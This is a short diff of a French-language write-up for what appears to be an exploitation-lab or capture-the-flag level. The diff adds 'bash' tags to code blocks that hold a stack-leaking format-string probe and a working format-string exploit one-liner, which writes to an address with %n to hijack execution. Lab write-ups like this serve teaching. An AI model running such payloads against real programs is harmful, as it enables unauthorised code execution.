@@ -83,7 +83,7 @@ disas exit
 
 On remarque qu'en affichant les prochains octets de la stack on tombe rapidement sur le deuxieme buffer:
 
-```
+```bash
 ./level0
 username: %x %x %x %x %x %x %x %x %x %x
 password: AAAA
@@ -92,7 +92,7 @@ ffffe580 0 41 2a2a2a2a 2a2a2a2a ffffe778 f7ff9a08 41414141 0 0 0 0 0 0 does not 
 
 Nous avons donc toutes les ressources necessaires pour rediriger l'execution du code vers la portion qui nous interesse:
 
-```
+```bash
 (python -c 'print "%4196997c%8$n" + "\n" + "\x28\x12\x60"' ; cat) | ./level02
 ```
 
